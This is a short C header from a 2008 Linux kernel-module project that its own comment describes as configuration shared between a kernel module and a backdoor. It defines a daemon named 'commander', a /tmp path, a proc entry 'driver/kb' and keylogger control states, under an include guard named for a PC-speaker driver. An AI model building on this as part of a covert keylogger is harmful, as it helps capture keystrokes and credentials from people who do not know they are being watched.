/**
 * File: lkm_config.h
 * 
 * Notes: Config info share with LKM and backdoor.  
 * 
 * Authors: Stephen Makonin
 *          Torin Sandall
 * 
 * Date: May/June 2008
 *
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#ifndef __PCSPKR_H__
#define __PCSPKR_H__

#define DAEMON_NAME   "commander"
#define FILE_LOCATION "/tmp/"DAEMON_NAME
#define KB_PROC_LOCATION "driver/kb"

#define KEYLOG_STATE_STOP  0
#define KEYLOG_STATE_START 1
#define KEYLOG_STATE_CLEAR 2

#define KEYLOG_BUFLEN 2048

#endif
